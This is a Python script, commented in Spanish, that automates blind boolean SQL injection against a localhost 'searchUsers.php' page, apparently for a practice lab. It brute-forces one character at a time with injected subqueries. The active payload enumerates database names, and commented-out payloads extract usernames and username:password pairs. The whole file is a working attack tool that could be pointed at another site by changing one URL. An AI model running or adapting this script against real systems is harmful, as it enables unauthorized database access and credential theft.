#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig,frame):
    print("\n\n[!] Saliendo....\n")
    sys.exit(1)

#Ctrl_c
signal.signal(signal.SIGINT, def_handler)

#variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    p2 = log.progress("Datos extraidos")

    extracted_info = ""

    time.sleep(2)
    for position in range(1,50):
        for character in range(33,126):
            #Para sacar un nombre de usuario
            # sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from users where id = 1)=%d)" % (position, character)
            #Para sacar todos los nombres de usuarios
            #sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
            #Para conseguir usuarios y passwords:
            #sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
            #Enumeracion de bases de datos 
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
            p1.status(sqli_url)
            
            r = requests.get(sqli_url)
            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    makeSQLI()